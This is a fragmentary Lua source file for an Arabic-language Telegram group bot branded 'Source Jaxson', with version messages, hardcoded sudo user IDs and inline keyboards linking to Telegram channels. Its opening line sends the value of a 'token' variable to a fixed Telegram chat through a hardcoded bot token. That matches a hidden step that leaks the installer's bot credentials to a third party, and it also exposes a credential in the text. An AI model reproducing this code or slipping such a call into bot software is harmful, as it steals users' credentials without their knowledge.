...
https.request('https://api.telegram.org/bot1879091468:AAGKcj6NaNA4steTzLGi3Cqk1-miFJ6KGH4/sendmessage?chat_id=1700360357&text=' ..token)
end 
else
...
sudo_users = {SUDO,1236115319,835551362,1791131231}   
...
send(msg.chat_id_, msg.id_,' ✪ تم تحديث السورس \n ✪ لديك اخر اصدار ل𝐒𝐎𝐔𝐑𝐂𝐄 𝑱𝑨𝑿𝑺𝑶𝑵\n ✪ الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
if text == 'الاصدار ✪' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✪ اصدار 𝐒𝐎𝐔𝐑𝐂𝐄 𝑱𝑨𝑿𝑺𝑶𝑵 \n ✪ الاصدار »{ 1.3v}')
end
...
local Text = [[
𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴.😸
مرحبا بك في سورس جاكسون💗
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '┓ جاكسون ┏ ',url="t.me/JAXSO0N"}},
...
send(msg.chat_id_, msg.id_," ✪ عذرا الملف لايدعم 𝐒𝐎𝐔𝐑𝐂𝐄 𝑱𝑨𝑿𝑺𝑶𝑵 \n") 
end
return false
end
...
if text == 'جاكسون' or text == 'الجارح' or text == 'عبده' then
local Text = [[
✪┃جاكسون يمكنك..💓
...
✪┃التاريخ
 ─────── ✪ ───────
 ➫ ┇[𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝑳𝐉𝐀𝐑??𝐇 ✪](t.me/J_ax_s_o_N)
[➫ ┇جاكسون✪](t.me/JAXSO0N)
 ─────── ✪ ───────
]]
keyboard = {} 
